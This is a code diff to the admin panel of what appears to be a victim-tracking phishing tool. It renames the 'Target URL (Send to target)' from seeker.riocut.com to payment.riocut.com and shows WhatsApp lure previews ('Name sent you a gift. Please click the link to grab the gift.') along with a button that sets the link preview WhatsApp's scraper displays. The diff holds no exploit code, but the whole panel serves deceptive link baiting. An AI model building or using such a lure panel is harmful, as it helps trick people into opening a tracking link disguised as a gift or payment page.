@@ -801,8 +801,8 @@
           <div id="modalActiveLinkBox" class="flex items-center bg-surface-900 border border-cyan-500/30 rounded-xl px-3 py-1.5 gap-2 max-w-full justify-between">
             <div class="min-w-0 pr-2">
               <span class="text-[10px] text-slate-500 block">Target URL (Send to target):</span>
-              <a id="modalTargetUrlLink" href="https://seeker.riocut.com" target="_blank" class="font-mono text-cyan-400 font-bold truncate block hover:underline text-xs max-w-[260px] sm:max-w-[340px]">
-                https://seeker.riocut.com
+              <a id="modalTargetUrlLink" href="https://payment.riocut.com" target="_blank" class="font-mono text-cyan-400 font-bold truncate block hover:underline text-xs max-w-[260px] sm:max-w-[340px]">
+                https://payment.riocut.com
               </a>
             </div>
             <div class="flex items-center space-x-1.5 shrink-0">
@@ -814,7 +814,7 @@
                 <i data-lucide="message-circle" class="w-3.5 h-3.5"></i>
                 <span class="text-[10px] font-semibold hidden sm:inline">WhatsApp</span>
               </button>
-              <a id="modalTargetUrlExternal" href="https://seeker.riocut.com" target="_blank" title="Test in new tab" class="p-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition">
+              <a id="modalTargetUrlExternal" href="https://payment.riocut.com" target="_blank" title="Test in new tab" class="p-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition">
                 <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
               </a>
             </div>
@@ -1278,7 +1278,7 @@
               <span id="waApplyLiveBtnText">🚀 Apply to Live Tracker (Set Link Preview)</span>
             </button>
             <p class="text-[10px] text-slate-400 text-center leading-tight">
-              Updates seeker.riocut.com so WhatsApp's scraper automatically pulls this Title, Description & Photo thumbnail.
+              Updates payment.riocut.com so WhatsApp's scraper automatically pulls this Title, Description & Photo thumbnail.
             </p>
           </div>
 
@@ -1413,7 +1413,7 @@
                   <div class="px-1 space-y-0.5">
                     <div id="waPhotoTitle" class="font-bold text-white text-[12px] leading-tight">Name sent you a gift.</div>
                     <div id="waPhotoDesc" class="text-slate-200 text-[11px] leading-snug">Please click the link to grab the gift.</div>
-                    <div id="waPhotoLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all pt-0.5">https://seeker.riocut.com</div>
+                    <div id="waPhotoLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all pt-0.5">https://payment.riocut.com</div>
                   </div>
                 </div>
 
@@ -1423,12 +1423,12 @@
                   <div class="bg-[#024436]/90 border border-white/10 rounded-lg overflow-hidden flex flex-col">
                     <div class="w-full h-32 bg-black/30 overflow-hidden relative">
                       <img id="waPreviewImgCard" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop" alt="Card Image" class="w-full h-full object-cover">
-                      <span class="absolute bottom-1.5 left-2 bg-black/60 backdrop-blur-sm text-slate-300 text-[9px] px-1.5 py-0.5 rounded font-mono">seeker.riocut.com</span>
+                      <span class="absolute bottom-1.5 left-2 bg-black/60 backdrop-blur-sm text-slate-300 text-[9px] px-1.5 py-0.5 rounded font-mono">payment.riocut.com</span>
                     </div>
                     <div class="p-2 space-y-0.5">
                       <div id="waCardTitle" class="font-bold text-white text-[11.5px] leading-snug line-clamp-1">Name sent you a gift.</div>
                       <div id="waCardDesc" class="text-slate-300 text-[10.5px] leading-snug line-clamp-2">Please click the link to grab the gift.</div>
-                      <div class="text-[9.5px] text-slate-400 font-mono pt-0.5 truncate">https://seeker.riocut.com</div>
+                      <div class="text-[9.5px] text-slate-400 font-mono pt-0.5 truncate">https://payment.riocut.com</div>
                     </div>
                   </div>
 
@@ -1436,7 +1436,7 @@
                   <div class="px-1 space-y-0.5">
                     <div id="waBubbleTitle" class="font-bold text-white text-[11.5px]">Name sent you a gift.</div>
                     <div id="waBubbleDesc" class="italic text-slate-200 text-[10.5px]">Please click the link to grab the gift.</div>
-                    <div id="waBubbleLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all">🔗 https://seeker.riocut.com</div>
+                    <div id="waBubbleLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all">🔗 https://payment.riocut.com</div>
                   </div>
                 </div>
 
@@ -3620,7 +3620,7 @@
       const host = window.location.hostname || 'localhost';
       const proto = window.location.protocol || 'http:';
       
-      // If browsing via admin.seeker.riocut.com or admin-seeker.riocut.com
+      // If browsing via admin.payment.riocut.com or admin-payment.riocut.com
       if (host.startsWith('admin.')) {
         return `${proto}//${host.replace('admin.', '')}`;
       }
